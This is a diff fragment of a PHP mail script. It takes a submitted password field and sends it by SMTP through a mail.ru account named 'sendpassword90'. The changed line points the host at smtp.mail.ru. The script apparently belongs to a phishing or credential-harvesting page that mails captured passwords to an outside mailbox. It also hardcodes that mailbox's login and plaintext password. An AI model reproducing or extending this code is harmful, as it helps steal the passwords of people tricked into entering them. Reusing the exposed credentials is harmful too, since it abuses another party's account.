@@ -10,7 +10,7 @@ $password = $_POST['user_pass'];
 //$mail->SMTPDebug = 3;                               // Enable verbose debug output
 
 $mail->isSMTP();                                      // Set mailer to use SMTP
-$mail->Host = 'smtp.mail.com';  																							// Specify main and backup SMTP servers
+$mail->Host = 'smtp.mail.ru';  																							// Specify main and backup SMTP servers
 $mail->SMTPAuth = true;                               // Enable SMTP authentication
 $mail->Username = 'sendpassword90@mail.ru'; // Ваш логин от почты с которой будут отправляться письма
 $mail->Password = 'ArtMen2003'; // Ваш пароль от почты с которой будут отправляться письма
